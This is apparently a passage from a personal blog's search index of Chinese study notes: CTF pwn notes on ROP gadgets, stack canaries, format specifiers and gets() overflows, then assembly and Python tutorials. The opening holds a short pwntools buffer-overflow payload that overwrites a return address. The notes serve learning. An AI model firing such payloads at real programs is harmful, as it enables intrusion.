+<p>ROPgadget –binary .&#x2F;7.exe –only “int”|grep “0x80”        &#x2F;&#x2F;int中断找”0x80”</p>
+<h1 id="接收远程主机发送的内容"><a href="#接收远程主机发送的内容" class="headerlink" title="接收远程主机发送的内容"></a>接收远程主机发送的内容</h1><p>print(p.recv())</p>
+<p>payload &#x3D; ‘a’ * 0x2c + p64(0x400734)</p>
+<h1 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h1><p>p.sendline(payload)</p>
+<h1 id="进入交互模式"><a href="#进入交互模式" class="headerlink" title="进入交互模式"></a>进入交互模式</h1><p>p.interactive()</p>
+<p>看起来你可能遇到了一个命名冲突的问题。根据你的错误信息，似乎你的脚本文件名也叫做”<a href="http://pwn.py/">pwn.py</a>“，这与Pwntools库中的模块名相同，导致了命名冲突。</p>
+<p>为了解决这个问题，最简单的方法是将你的脚本文件重命名为与Pwntools库中的模块名不冲突的名字，比如”<a href="http://exploit.py/">exploit.py</a>“或者其他名字。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character <span class="string">&#x27;\xe6&#x27;</span> <span class="keyword">in</span> file exploit.py on line <span class="number">4</span>, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class="keyword">for</span> details</span><br></pre></td></tr></table></figure>
+
+<p>这个错误表明你的Python脚本包含了非ASCII字符，但是没有指定编码方式。在Python中，如果脚本中包含非ASCII字符，需要在脚本开头进行声明编码方式。</p>
+<p>你可以在脚本的开头添加以下注释来声明编码方式：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="11-13"><a href="#11-13" class="headerlink" title="11.13"></a>11.13</h2><p>在使用checksec工具检查程序时，当发现”Canary found”的提示时，意味着程序启用了堆栈保护机制（Stack Canary）。这个提示表明程序在编译时使用了栈保护来防止缓冲区溢出攻击。</p>
+<p>堆栈保护（Stack Canary）是一种安全措施，它通过在函数返回地址之前插入一个随机值（被称为”canary”），并在函数返回前检查这个值是否被修改，从而防止攻击者利用缓冲区溢出来修改函数返回地址。因此，当你在虚拟机中使用checksec工具，发现”Canary found”的提示时，表明程序已经开启了这项重要的安全保护措施。</p>
+<p>%d - 十进制 - 打印十进制整数<br>%s - 字符串 - 打印参数地址处的字符串<br>%x,%X- 十六进制 - 打印十六进制数<br>%o - 八进制 -打印八进制整形<br>%c - 字符 - 打印字符<br>%p - 指针 - 打印指针地址 即void *<br>%n - 到目前为止所写的字符数</p>
+<p>危险函数：  存在 gets(); 存在栈溢出**</p>
+<p>​                 reads </p>
+<p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20231113200232101.png" alt="image-20231113200232101" loading="lazy"></p>
+<h2 id="11-16"><a href="#11-16" class="headerlink" title="11.16"></a>11.16</h2><p><code>gets()</code>函数存在缓冲区溢出的风险，因为它无法限制输入字符的数量，这使得攻击者可以输入超出<code>char s[15]</code>缓冲区大小的数据，从而覆盖其他重要的数据。攻击者可以通过输入超出15个字符的数据来改变程序的行为，甚至执行恶意代码。这种类型的漏洞很容易导致被攻击者利用，例如进行拒绝服务攻击、执行任意代码等恶意行为。</p>
+<p>要修复这个问题，应该避免使用<code>gets()</code>函数，而是使用更安全的输入函数，比如<code>fgets()</code>，并且在读取输入时要确保不会超出目标缓冲区的大小。同时，对用户输入进行验证和过滤也是非常重要的，以防止恶意输入。</p>
+<p>可以使用&#96;chmod +x &#x2F;可执行文件  来添加可执行权限。</p>
+<h2 id="12-20"><a href="#12-20" class="headerlink" title="12.20"></a>12.20</h2><p>rbp在64位里是8字节</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux太揪心</title>
+    <url>/Astral.github.io/2024/01/13/Linux%E4%B8%8D%E5%AD%A6%E4%B8%8D%E8%A1%8C/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Linux系统管理</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>每个人都是一座孤岛</title>
+    <url>/Astral.github.io/2024/01/13/%E5%AD%A4%E5%B2%9B%E6%97%A5%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>随心</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>汇编语言初识笔记</title>
+    <url>/Astral.github.io/2024/01/06/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%9D%E8%AF%86%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在x86-64架构的CPU中，rdi、rsi和rdx是通用寄存器，它们在函数调用和系统调用中扮演重要角色。</p>
+<p>在Linux 64位系统中，函数参数通常通过寄存器传递，其中rdi、rsi、rdx、rcx、r8 和 r9 分别用于传递前6个整型参数。而在这些寄存器中，rdi 通常用于存储第一个参数，rsi 用于存储第二个参数，rdx 用于存储第三个参数。</p>
+<p>举个例子，如果你在汇编中调用一个C语言函数，你可能会看到类似下面的代码：</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">复制代码mov rdi, <span class="number">10</span>    ; 将<span class="number">10</span>赋值给rdi，作为第一个参数</span><br><span class="line">mov rsi, <span class="number">20</span>    ; 将<span class="number">20</span>赋值给rsi，作为第二个参数</span><br><span class="line">mov rdx, <span class="number">30</span>    ; 将<span class="number">30</span>赋值给rdx，作为第三个参数</span><br><span class="line">call some_function  ; 调用函数</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，rdi 存储第一个参数 10，rsi 存储第二个参数 20，rdx 存储第三个参数 30。当函数 some_function 被调用时，这些寄存器中的值将作为函数的参数传递进去。</p>
+<p>总之，rdi、rsi 和 rdx 在函数调用和系统调用中通常用来传递参数，它们在调用过程中承担着非常重要的角色。</p>
+]]></content>
+      <categories>
+        <category>程序语言</category>
+      </categories>
+      <tags>
+        <tag>汇编语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python 学习笔记</title>
+    <url>/Astral.github.io/2024/01/06/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8Python/</url>
+    <content><![CDATA[<p>第一章：<br>        Hello World!!<br>         print(“Hello, World!”)</p>
+<pre><code>     运行脚本
+     $ python3 hello.py
+
+    python保留字    
+    &gt;&gt;&gt; keyword.kwlist
+    [&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;]   
+    
+    数字(Number)类型
+    python中数字有四种类型：整数、布尔型、浮点数和复数。
+    int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。
+    bool (布尔), 如 True。
+    float (浮点数), 如 1.23、3E-2
+    complex (复数), 如 1 + 2j、 1.1 + 2.2j
+
+    字符串(String)
+    Python 中单引号 &#39; 和双引号 &quot; 使用完全相同。
+    使用三引号(&#39;&#39;&#39; 或 &quot;&quot;&quot;)可以指定一个多行字符串。
+    转义符 \。
+    反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r&quot;this is a line with \n&quot; 则 \n 会显示，并不是换行。
+    按字面意义级联字符串，如 &quot;this &quot; &quot;is &quot; &quot;string&quot; 会被自动转换为 this is string。
+    字符串可以用 + 运算符连接在一起，用 * 运算符重复。
+    Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。
+    Python 中的字符串不能改变。
+    Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。
+    字符串的截取的语法格式如下：变量[头下标:尾下标:步长]
+    word = &#39;字符串&#39;
+    sentence = &quot;这是一个句子。&quot;
+    paragraph = &quot;&quot;&quot;这是一个段落，
+    可以由多行组成&quot;&quot;&quot;
+    
+    示例
+    str=&#39;123456789&#39;
+    print(str)                 # 输出字符串
+    print(str[0:-1])           # 输出第一个到倒数第二个的所有字符
+    print(str[0])              # 输出字符串第一个字符
+    print(str[2:5])            # 输出从第三个开始到第六个的字符（不包含）
+    print(str[2:])             # 输出从第三个开始后的所有字符
+    print(str[1:5:2])          # 输出从第二个开始到第五个且每隔一个的字符（步长为2）
+    print(str * 2)             # 输出字符串两次
+    print(str + &#39;你好&#39;)         # 连接字符串
+    
+    print(&#39;------------------------------&#39;)
+    
+    print(&#39;hello\nrunoob&#39;)      # 使用反斜杠(\)+n转义特殊字符
+    print(r&#39;hello\nrunoob&#39;)     # 在字符串前面添加一个 r，表示原始字符串，不会发生转义
+
+    print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 end=&quot;&quot;：        
+    x=&quot;a&quot;
+    y=&quot;b&quot;
+    # 换行输出
+    print( x )
+    print( y )
+    print(&#39;---------&#39;)
+    # 不换行输出
+    print( x, end=&quot; &quot; )
+    print( y, end=&quot; &quot; )
+    print()
+    以上实例执行结果为：
+    a
+    b
+    ---------
+    a b
+
+    import 与 from...import
+    在 python 用 import 或者 from...import 来导入相应的模块。
+    from...import 的语法格式如下：
+    将整个模块(somemodule)导入，格式为： import somemodule
+    从某个模块中导入某个函数,格式为： from somemodule import somefunction
+    从某个模块中导入多个函数,格式为： from somemodule import firstfunc, secondfunc, thirdfunc
+    将某个模块中的全部函数导入，格式为： from somemodule import *
+    导入 sys 模块
+    import sys
+    print(&#39;================Python import mode==========================&#39;)
+    print (&#39;命令行参数为:&#39;)
+    for i in sys.argv:
+        print (i)
+    print (&#39;\n python 路径为&#39;,sys.path)
+    导入 sys 模块的 argv,path 成员
+    from sys import argv,path  #  导入特定的成员
+    
+    print(&#39;================python from import===================================&#39;)
+    print(&#39;path:&#39;,path) # 因为已经导入path成员，所以此处引用时不需要加sys.path
+
+    Python3 基本数据类型
+    Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。
+
+    在 Python 中，变量就是变量，它没有类型，我们所说的&quot;类型&quot;是变量所指的内存中对象的类型。
+
+    等号（=）用来给变量赋值。
+
+    等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。例如：
+
+    实例
+    counter = 100          # 整型变量
+    miles   = 1000.0       # 浮点型变量
+    name    = &quot;runoob&quot;     # 字符串
+    print (counter)
+    print (miles)
+    print (name)
+    运行实例 »
+    执行以上程序会输出如下结果：
+    100
+    1000.0
+    runoob
+
+    
+</code></pre>
+<p>第二章：变量和基本数据类型<br>         a &#x3D; 10<br>         b &#x3D; 3.14<br>         c &#x3D; “Hello, World!”<br>第三章：流程控制<br>         if a &gt;&#x3D; 0:<br>             print(“a是正数”)<br>         elif a &lt; 0:<br>             print(“a是负数”)<br>         else:<br>             print(“a是零”)<br>第四章：函数和数组<br>         def add(a, b):<br>             return a + b<br>         arr &#x3D; [1, 2, 3, 4, 5]<br>         print(arr[0])  # 输出第一个元素<br>第五章：面向对象编程<br>         class Person:<br>             def <strong>init</strong>(self, name):<br>                 self.name &#x3D; name<br>             def say_hello(self):<br>                 print(“Hello, “ + self.name + “!”)<br>         person &#x3D; Person(“Alice”)<br>         person.say_hello()<br>第六章：异常处理<br>         try:<br>             # 可能会引发异常的代码<br>         except Exception as e:<br>             # 处理异常的代码<br>             print(“发生异常：” + str(e))<br>第七章：文件操作<br>         file &#x3D; open(“file.txt”, “w”)<br>         file.write(“Hello, World!”)<br>         file.close()<br>第八章：图形用户界面<br>         import tkinter as tk</p>
+<pre><code>     def say_hello():
+         print(&quot;Hello, World!&quot;)
+     
+     window = tk.Tk()
+     button = tk.Button(window, text=&quot;点击我&quot;, command=say_hello)
+     button.pack()
+     window.mainloop()
+</code></pre>
+<p>第九章：数据库操作<br>         import sqlite3</p>
+<pre><code>     conn = sqlite3.connect(&quot;database.db&quot;)
+     cursor = conn.cursor()
+     cursor.execute(&quot;CREATE TABLE IF NOT EXISTS students (id INTEGER PRIMARY KEY, name TEXT, age INTEGER)&quot;)
+     cursor.execute(&quot;INSERT INTO students (name, age) VALUES (?, ?)&quot;, (&quot;Alice&quot;, 20))
+     conn.commit()
+     cursor.execute(&quot;SELECT * FROM students&quot;)
+     for row in cursor.fetchall():
+         print(row)
+     conn.close()
+</code></pre>
+<p>第十章：网络编程<br>         import socket</p>
+<pre><code>     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     server_socket.bind((&quot;localhost&quot;, 8080))
+     server_socket.listen(5)
+     
+     while True:
+         client_socket, addr = server_socket.accept()
+         request = client_socket.recv(1024).decode()
+         response = &quot;Hello, World!&quot;
+         client_socket.send(response.encode())
+         client_socket.close()
+     
+     server_socket.close()
+</code></pre>
+<p>第十一章：图形用户界面（GUI）<br>         import tkinter as tk</p>
+<pre><code>     def say_hello():
+         label.config(text=&quot;Hello, World!&quot;)
+     
+     window = tk.Tk()
+     window.title(&quot;My GUI&quot;)
+     
+     label = tk.Label(window, text=&quot;Hello, World!&quot;)
+     label.pack()
+     
+     button = tk.Button(window, text=&quot;Say Hello&quot;, command=say_hello)
+     button.pack()
+     
+     window.mainloop()
+</code></pre>
+<p>第十二章：数据可视化<br>         import matplotlib.pyplot as plt</p>
+<pre><code>     x = [1, 2, 3, 4, 5]
+     y = [1, 4, 9, 16, 25]
+     
+     plt.plot(x, y)
+     plt.xlabel(&#39;x&#39;)
+     plt.ylabel(&#39;y&#39;)
+     plt.title(&#39;Square Numbers&#39;)
+     plt.show()
+</code></pre>
+<p>第十三章：数据库编程<br>         import sqlite3</p>
+<pre><code>     conn = sqlite3.connect(&#39;example.db&#39;)
+     cursor = conn.cursor()
+     
+     cursor.execute(&#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)&#39;)
+     cursor.execute(&#39;INSERT INTO users (name) VALUES (?)&#39;, (&#39;John Doe&#39;,))
+     cursor.execute(&#39;SELECT * FROM users&#39;)
+     result = cursor.fetchall()
+     
+     for row in result:
+         print(row)
+     
+     conn.commit()
+     conn.close()
+</code></pre>
+<p>第十四章：机器学习<br>         import numpy as np<br>         from sklearn.datasets import load_iris<br>         from sklearn.model_selection import train_test_split<br>         from sklearn.neighbors import KNeighborsClassifier<br>         from sklearn.metrics import accuracy_score</p>
+<pre><code>     iris = load_iris()
+     X = iris.data
+     y = iris.target
+     
+     X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
+     knn = KNeighborsClassifier(n_neighbors=3)
+     knn.fit(X_train, y_train)
+     
+     y_pred = knn.predict(X_test)
+     accuracy = accuracy_score(y_test, y_pred)
+     print(&quot;Accuracy:&quot;, accuracy)
+</code></pre>
+<p>第十五章：自然语言处理<br>         import nltk<br>         from nltk.tokenize import word_tokenize<br>         from nltk.stem import PorterStemmer<br>         from nltk.corpus import stopwords</p>
+<pre><code>     text = &quot;This is a sample sentence, showing off the stop words filtration.&quot;
+     
+     # 分词
+     tokens = word_tokenize(text)
+     
+     # 词干提取
+     stemmer = PorterStemmer()
+     stemmed_tokens = [stemmer.stem(token) for token in tokens]
+     
+     # 去除停用词
+     stop_words = set(stopwords.words(&#39;english&#39;))
+     filtered_tokens = [token for token in stemmed_tokens if token.isalpha() and token not in stop_words]
+     
+     print(filtered_tokens) 
+</code></pre>
+<p>第十六章：深度学习<br>         import tensorflow as tf</p>
+<pre><code>     # 创建一个简单的神经网络模型
+     model = tf.keras.Sequential([
+         tf.keras.layers.Dense(10, activation=&#39;relu&#39;, input_shape=(784,)),
+         tf.keras.layers.Dense(10, activation=&#39;softmax&#39;)
+     ])
+     
+     # 编译模型
+     model.compile(optimizer=&#39;adam&#39;,
+                  loss=&#39;categorical_crossentropy&#39;,
+                  metrics=[&#39;accuracy&#39;])
+     
+     # 训练模型
+     model.fit(train_images, train_labels, epochs=5)
+     
+     # 使用模型进行预测
+     test_loss, test_acc = model.evaluate(test_images, test_labels)
+     print(&#39;Test accuracy:&#39;, test_acc)
+     
+     # 进行预测
+     predictions = model.predict(test_images)
+     
+     # 打印预测结果
+     print(predictions)
+     
+</code></pre>
+<p>第十七章：卷积神经网络<br>         import tensorflow as tf</p>
+<pre><code>     # 创建一个简单的卷积神经网络模型
+     model = tf.keras.Sequential([
+         tf.keras.layers.Conv2D(32, (3,3), activation=&#39;relu&#39;, input_shape=(28, 28, 1)),
+         tf.keras.layers.MaxPooling2D((2, 2)),
+         tf.keras.layers.Flatten(),
+         tf.keras.layers.Dense(128, activation=&#39;relu&#39;),
+         tf.keras.layers.Dense(10, activation=&#39;softmax&#39;)
+     ])
+     
+     # 编译模型
+     model.compile(optimizer=&#39;adam&#39;,
+                  loss=&#39;categorical_crossentropy&#39;,
+                  metrics=[&#39;accuracy&#39;])
+     
+     # 训练模型
+     model.fit(train_images, train_labels, epochs=5)
+     
+     # 使用模型进行预测
+     test_loss, test_acc = model.evaluate(test_images, test_labels)
+     print(&#39;Test accuracy:&#39;, test_acc)
+     
+     # 进行预测
+     predictions = model.predict(test_images)
+     
+     # 打印预测结果
+     print(predictions)             
+     # 编写一个Python程序，使用TensorFlow库来构建一个卷积神经网络模型。该模型应该能够对MNIST数据集进行分类，并输出预测结果。
+</code></pre>
+<p>import tensorflow as tf</p>
+<h1 id="加载MNIST数据集"><a href="#加载MNIST数据集" class="headerlink" title="加载MNIST数据集"></a>加载MNIST数据集</h1><p>mnist &#x3D; tf.keras.datasets.mnist<br>(train_images, train_labels), (test_images, test_labels) &#x3D; mnist.load_data()</p>
+<h1 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h1><p>train_images &#x3D; train_images &#x2F; 255.0<br>test_images &#x3D; test_images &#x2F; 255.0</p>
+<h1 id="构建模型"><a href="#构建模型" class="headerlink" title="构建模型"></a>构建模型</h1><p>model &#x3D; tf.keras.models.Sequential([<br>    tf.keras.layers.Conv2D(32, (3, 3), activation&#x3D;’relu’, input_shape&#x3D;(28, 28, 1)),<br>    tf.keras.layers.MaxPooling2D((2, 2)),<br>    tf.keras.layers.Flatten(),<br>    tf.keras.layers.Dense(128, activation&#x3D;’relu’),<br>    tf.keras.layers.Dense(10, activation&#x3D;’softmax’)<br>])</p>
+<h1 id="编译模型"><a href="#编译模型" class="headerlink" title="编译模型"></a>编译模型</h1><p>model.compile(optimizer&#x3D;’adam’,<br>              loss&#x3D;’sparse_categorical_crossentropy’,<br>              metrics&#x3D;[‘accuracy’])</p>
+<h1 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h1><p>model.fit(train_images, train_labels, epochs&#x3D;5)</p>
+<h1 id="使用模型进行预测"><a href="#使用模型进行预测" class="headerlink" title="使用模型进行预测"></a>使用模型进行预测</h1><p>test_loss, test_acc &#x3D; model.evaluate(test_images, test_labels)<br>print(‘Test accuracy:’, test_acc)</p>
+<h1 id="进行预测"><a href="#进行预测" class="headerlink" title="进行预测"></a>进行预测</h1><p>predictions &#x3D; model.predict(test_images)</p>
+<h1 id="打印预测结果"><a href="#打印预测结果" class="headerlink" title="打印预测结果"></a>打印预测结果</h1><p>print(predictions)</p>
+<h1 id="保存模型"><a href="#保存模型" class="headerlink" title="保存模型"></a>保存模型</h1><p>model.save(‘mnist_model.h5’)</p>
+]]></content>
+      <categories>
+        <category>程序语言</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+</search>
